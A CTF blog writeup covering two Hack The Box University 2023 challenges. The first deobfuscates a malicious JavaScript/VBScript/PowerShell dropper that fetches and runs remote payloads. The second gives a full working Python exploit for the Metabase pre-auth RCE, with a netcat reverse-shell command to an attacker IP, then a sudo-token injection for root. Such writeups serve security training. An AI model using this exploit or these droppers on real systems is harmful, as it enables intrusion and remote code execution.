---
layout: single
title:  "Hack The Box University CTF 2023: Brains & Bytes Writeup"
seo_title: "CTF writeup for some of the Forensics and Pwn Challenges of the Hack The Box University CTF 2023 Competition"
date:   2023-10-28 15:30:00 +0200
categories: ['HackTheBox', 'CTF', 'Forensics', 'Web-Exploitation']
classes: wide
toc: true
excerpt: Hack The Box University CTF 2023 writeups for forensics and pwn challenges.
header:
    image: /assets/images/headers/htb-uni-ctf.jpg
    teaser: /assets/images/headers/htb-uni-ctf.jpg
---
# Hack The Box University CTF 2023: Brains & Bytes - Writeups
## Forensics: One Step Closer - Easy
### Description
Tasked with defending the antidote's research, a diverse group of students united against a relentless cyber onslaught. As codes clashed and defenses were tested, their collective effort stood as humanity's beacon, inching closer to safeguarding the research for the cure with every thwarted attack. A stealthy attack might have penetrated their defenses. Along with the Hackster's University students, analyze the provided file so you can detect this attack in the future. 

### Vaccine File
We are given a `vaccine.js` file that contains some malicious obfuscated JS code. Two function are never used inside the script, so we can remove them. After renaming some variables we can figure out what the remainder of the script is doing:
```js
var HTTPObject = new ActiveXObject("MSXML2.XMLHTTP.6.0");
var FileSystemObject = new ActiveXObject("Scripting.FileSystemObject");
var ShellObject = new ActiveXObject("WScript.Shell");
var TmpPath = 'C:\\Windows\\Temp';
var Filename = FileSystemObject.GetTempName() + ".vbs"; 
var FilePath = FileSystemObject.BuildPath(TmpPath, Filename);
HTTPObject.open("GET", "http://infected.human.htb/d/BKtQR", false);
HTTPObject.send();

if (HTTPObject.status === 200) {
    var scriptText = HTTPObject.responseText;
    var FileHandle = FileSystemObject.CreateTextFile(FilePath, true);
    FileHandle.write(scriptText);
    FileHandle.close();
    var ExecutionHandle = ShellObject.Exec('wscript "' + FilePath + '"');
    while (ExecutionHandle.Status === 0) {
        WScript.Sleep(100);
    }
    FileSystemObject.DeleteFile(FilePath);

} else {
    WScript.Echo("Fatal: " + HTTPObject.status);
}
```
The script will download a `VBS` file, save it in a temp folder and execute it. The malicious file is coming from `http://infected.human.htb/d/BKtQR`. After startup up the docker instance and adding the domain to our host file, we can download this file to our machine.

This file contains a large amount of obfuscated data. Some variables that are never reused are removed so that we can better understand the script:
```
OBFUSCATED  = "Jem9tYmllcBpem9tYmllcG0em9tYmllcYQBnem9tY...
OBFUSCATED = Replace( OBFUSCATED, CpBIhAVXkwtYAYiRfMTeXHopPLyLoHhHtDaysxBQVjyz...

COMMAND = COMMAND & StrReverse("xujWO$;")
COMMAND = COMMAND & StrReverse("ys[ = d")
COMMAND = COMMAND & StrReverse("eT.mets")
COMMAND = COMMAND & StrReverse("ocne.tx")
COMMAND = COMMAND & StrReverse("::]gnid")
COMMAND = COMMAND & StrReverse("edocinU")
COMMAND = COMMAND & StrReverse("rtSteG.")
COMMAND = COMMAND & StrReverse("gni")

COMMAND = COMMAND & "([ZjJMuHOyfLrFRZQLRAMTQIJoIsDKygFhOhIUsFhmYGpMtHYXYriuBkzrHlGxHgtwOVBcJpaoSYXw...
COMMAND = COMMAND & "wDRSCDEGplfmoDjPrgYmdejlOxRRTwXXqUxtEpkdbzFGZtRYqCBgefVWmDfUZnbLpaQQTIAMcveTJe...

...

COMMAND = Replace(COMMAND, "TQIJoIsDKygFhOhIUsFhmYGpMtHYXYriuBkzrHlGxHgtwOVBcJpaoSYXwYihoBDwDRSCDEGplfmoDjPrgYmdejlOxRRTwXXqUxtEpkdbzFGZtRYqCBgefVWmDfUZnbLpaQQTIAMcveTJekTjNZjNfCJawQsxvvTLaqAKZUciNlCQgVQFoKfnXYUTpOaNcbqsaDpdjNnD", "e")
COMMAND = Replace(COMMAND, "YdiovnqyjTDXTaRYzrOrPtPSPEkGydtHpsDzuMmtvwWDgfonHmlbiWofBzfzWwPCyghETBLJtSXhZTteJymwidWxlLmZRoJmxzHcFtMNHFLqYxcpgFpHeIhwiWILHovZEyZuwgHbTGwMVrwwjpWojiuZPXGPnkWzSsIhWOckYJSLGuGYaBQbdomrjcmnDFZVNWqVGjwx", "o")
COMMAND = Replace(COMMAND, "ZjJMuHOyfLrFRZQLRAMejVORkrLmnSCXRqVNBLINqTtavYGXNKmWkKgLUKpRuknZoStcKiPTtlSLTzbLLKnqBLvCxwwfYDUEJVRbZAqnPXJFfwKgaKoaTyXvWlktaXauDNHvgmoqbgdjOoBAwieAxhmIQTQGWVjowvkJpSMpEPnfitrQGRfXaVLxUPAmLRGwRAEgjqTg", "s")
COMMAND = Replace(COMMAND, "SjnKkClLMbtbUbEphNmdQTEXfhFHyXgQvKXvohDxuaGQdsTVSnrqEPEsLAdRQxDbDqFawzwRYThIFGZFjDIAEWMnWgxyLATxLKfXLJGtQgEqlXlrEBLbufduqlrgvcKaQAuxxmISiInqdFxetxSvuwcnvTQZlRnsnrezMZamRBgFTQGJcmEpKQISyYXRLVbdBQEdwdle", "t")
COMMAND = Replace(COMMAND, "VXIxBYQSKDryEAULIfGtTdegkaavJdWnPtXZlxmbyRZbRztkgJXWSKYsPfdAvLjUlqQqikfohaKubLssSrhTyIatsqjlfjIBXVfmwFkVqYIyCtYmjprSExKIzpcAdoVBTPRwuxasqmXvYvnHQlXgZBCYBqolLMBaNbIspDogrWvPdQlBBtHAGkUozkbMEJZIHTuiLIxX", "a")
COMMAND = Replace(COMMAND, "COMMANDdAuCBFCwdFvnAC", "A")

COMMAND = COMMAND & StrReverse("'DxujWO$ dnammoc- eliforPoN- ssapyb ycilopnoitucexe- neddih elytswodniw- exe.llehsrewop")
script_object.Run "powershell -command " & COMMAND, 0, False
```
After doing the required replacements in the code we get something like this:
```ps
$Codigo = 'JABpAG0AYQBnAGUAVQByAGwAIAA9ACAAJwBoAHQAdABwADoALwAvAGkAbgBmAGUAYwB0AGUAZAAuAHoAbwBtAGIAaQBlAC4AaAB0AGIALwBXAEoAdgBlAFgANwAxAGEAZwBtAE8AUQA2AEcAdwBfADEANgA5ADgANwA2ADIANgA0ADIALgBqAHAAZwAnADsAJAB3AGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJABpAG0AYQBnAGUAQgB5AHQAZQBzACAAPQA ...SNIP... WAHQAUABYAFIAcwBZAFQAOQAwAGUASABRAHUAYwBtAFYAbQBjADIANQBoAGMAbgBRAHYAYgB5ADkAdABiADIATQB1AGQARwA5AHcAYwAzAEIAdwBZAFMANQBtAE8AVABOAGoATgBpADEAbgBiAG0AbAByAFkAMgBGAG8ATAAyAEkAdgBNAEgAWQB2AGIAVwA5AGoATABuAE4AcABjAEcARgBsAGIARwBkAHYAYgAyAGMAdQBaAFcAZABoAGMAbQA5ADAAYwAyAFYAegBZAFcASgBsAGMAbQBsAG0ATAB5ADgANgBjADMAQgAwAGQARwBnAD0AJwAgACwAIAAnAGQAZgBkAGYAZAAnACAALAAgACcAZABmAGQAZgAnACAALAAgACcAZABmAGQAZgAnACAALAAgACcAZABhAGQAcwBhACcAIAAsACAAJwBkAGUAJwAgACwAIAAnAGMAdQAnACkAKQA='

powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command [system.Text.encoding]::Unicode.GetString([system.Convert]::Frombase64string($codigo))
```
The Base64 data decodes to:
```js
$imageUrl = 'http://infected.zombie.htb/WJveX71agmOQ6Gw_1698762642.jpg';
$webClient = New-Object System.Net.WebClient;$imageBytes = $webClient.DownloadData($imageUrl);
$imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);
$startFlag = '<<BASE64_START>>';
$endFlag = '<<BASE64_END>>';
$startIndex = $imageText.IndexOf($startFlag);$endIndex = $imageText.IndexOf($endFlag);
$startIndex -ge 0 -and $endIndex -gt $startIndex;$startIndex += $startFlag.Length;$base64Length = $endIndex - $startIndex;

$base64Command = $imageText.Substring($startIndex, $base64Length);$commandBytes = [System.Convert]::FromBase64String($base64Command);
$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);$type = $loadedAssembly.GetType('Fiber.Home');
$method = $type.GetMethod('VAI').Invoke($null, [object[]] ('ZDVkZmYyMWIxN2VlLTFmNDgtNWM3NC1jOTM0LWQ3M2MyYTYzPW5la290JmFpZGVtPXRsYT90eHQucmVmc25hcnQvby9tb2MudG9wc3BwYS5mOTNjNi1nbmlrY2FoL2IvMHYvbW9jLnNpcGFlbGdvb2cuZWdhcm90c2VzYWJlcmlmLy86c3B0dGg=' , 'dfdfd' , 'dfdf' , 'dfdf' , 'dadsa' , 'de' , 'cu'))
```
The script downloads an image from `http://infected.zombie.htb/WJveX71agmOQ6Gw_1698762642.jpg` and decodes the Base64 data inside the markers. We can download the image from the previously found link and decode the final part between `<<BASE64_START>>` and `<<BASE64_END>>`.

By decoding it we can get the flag at the end of the string.


## Fullpwn: Apethanto - Easy
### Description
Apethanto is an Easy Linux machine hosting a Metabase instance that is vulnerable to pre-authentication Remote Code Execution (RCE). By finding the exposed setup-token, the attacker leverages the vulnerability to obtain a reverse shell on the target. Once the attacker gets a shell on the remote machine as the user metabase he may notice that there is a cron that executes sudo apt update from a different TTY terminal. This means, that the user metabase has an active SUDO token. Since the user belongs to the sudo group, the attacker is able to steal the valid SUDO token in order to get root privileges.

### Enumeration
```bash
rustscan -a 10.129.240.39 -- -A -sC
```
The scan output informs us that Nginx and SSH are the only available services listening on port 80 and 22 respectively, and we get redirected to `apethanto.htb` when visiting the website on port 80. Let's add this to our hosts file.
```
echo "10.129.240.39 apethanto.htb" | sudo tee -a /etc/hosts
```
The page appears mostly static, but hovering over the "For Doctors" hyperlink or inspecting the site's source code reveals a hyperlink to a metabase virtual host, which we can add to our hosts file.
```
echo "10.129.240.39 metabase.apethanto.htb" | sudo tee -a /etc/hosts
```
Browsing to the discovered virtual host, we find a login prompt for the Metabase service:

![metabase-login](/assets/images/web-exploitation/metabase-login.png)

With no credentials and nothing else to go by, we start researching recent vulnerabilities discovered in Metabase. A search for the keywords `metabase vulnerability cve` leads us to various [CVE repositories](https://www.cvedetails.com/vulnerability-list/vendor_id-19475/product_id-51231/Metabase-Metabase.html) that list an array of CVEs for the service.

### Foothold
Searching for that particular CVE leads us to a public [PoC](https://github.com/kh4sh3i/CVE-2023-38646). Since this PoC uses burp suite collaborator, we can create our own script based on this PoC. To start, we need to get the `setup_token` from our target. Next we define another function that will send our payload. Our final exploit script looks like this:
```python
import requests
import json
import base64
import argparse

def encode_command_to_b64(payload: str) -> str:
    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
    equals_count = encoded_payload.count('=')
    if equals_count >= 1:
        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()
    return encoded_payload

def get_setup_token_and_metabase_version(target_host):
    path = "/api/session/properties"
    url = f"{target_host}{path}"
    try:
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            data = response.json()
            setup_token = data.get("setup-token")
            metabase_version = data.get("version", {}).get("tag")

            if setup_token is None:
                print("Setup token not found or is null.")
                return None, None
            else:
                print(f"Setup Token: {setup_token}")
                print(f"Version: {metabase_version}")
                return setup_token, metabase_version
        else:
            print(f"Failed to obtain the token with status code {response.status_code}")
            return None, None
    except requests.exceptions.RequestException as e:
        print(f"Exception occurred: {e}")
        print(f"Failed to connect to {target_host}.")
        return None, None

def send_reverse_shell_request(target_host, setup_token, payload):
    headers = {
        "Content-Type": "application/json"
    }
    shell_url = f"{target_host}/api/setup/validate"
    shell_data = {
        "token": setup_token,
        "details": {
            "details": {
                "subprotocol": "h2",
                "classname": "org.h2.Driver",
                "advanced-options": True,
                "subname":"mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\"bash\", \"-c\", cmd})\\;}$$\\;CALL SHELLEXEC('{echo," + payload + "}|{base64,-d}|{bash,-i}');"
            },
            "name": "x",
            "engine": "postgres"
        }
    }

    try:
        print(f"Sending POST request to {shell_url}...")
        shell_response = requests.post(shell_url, headers=headers, data=json.dumps(shell_data))
        print(shell_response.text)
    except requests.exceptions.RequestException as e:
        print(f"Exception occurred: {e}")
        print(f"Failed to connect to {shell_url}.")
        return

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Metabase Exploit Script")
    parser.add_argument("-u", "--url", type=str, required=True, help="Target URL (e.g., http://localhost)")

    args = parser.parse_args()

    target_host = args.url
    print(f"Target Host: {target_host}")

    setup_token, metabase_version = get_setup_token_and_metabase_version(target_host)
    command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.240 443 >/tmp/f"
    payload = encode_command_to_b64(command)
    print("Sending payload: " + payload)
    send_reverse_shell_request(target_host, setup_token, payload)
    print("Reverse shell request sent successfully.")
```
Don't forget to change the command to make a reverse shell connection to your IP. Start a netcat listener on port 443 and run the script:
```bash
$ python3 exploit.py -u http://metabase.apethanto.htb
Target Host: http://metabase.apethanto.htb
Setup Token: 819139a8-1ce9-46f0-acf8-9b4fc0d1164b
Version: v0.46.6
Sending payload: cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgMTAuMTAuMTQuMjQwIDQ0MyA+L3RtcC9m
Sending POST request to http://metabase.apethanto.htb/api/setup/validate...

Reverse shell request sent successfully.
```
We instantly get a callback on our listener:
```bash
sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.240] from (UNKNOWN) [10.129.240.39] 59728
bash: cannot set terminal process group (730): Inappropriate ioctl for device
bash: no job control in this shell

metabase@Apethanto:~$
```

We now have a shell as the metabase user. The user flag can be found at `/home/metabase/user.txt`.

### Privilege Escalation
The only thing that stands out is that we are part of the `sudo` group.
```bash
metabase@Apethanto:~$ id

uid=998(metabase) gid=998(metabase) groups=998(metabase),27(sudo)
```
Looking around the web for more information, we find [this](https://github.com/nongiach/sudo_inject) project. We copy `exploit_v3.sh` from  the repo to our target. Then, we make it executable and execute it.
```
chmod +x exploit_v3.sh
./exploit_v3.sh
```
It might not work the first time if the SUDO token is expired, so after a few tries it should give us a root shell.
```bash
metabase@Apethanto:/tmp$ ./exploit_v3.sh
Injecting process 1038 -> bash
Injecting process 1041 -> bash
Injecting process 1047 -> bash
Injecting process 1198 -> bash
Injecting process 1275 -> bash

root@Apethanto:~# 
```
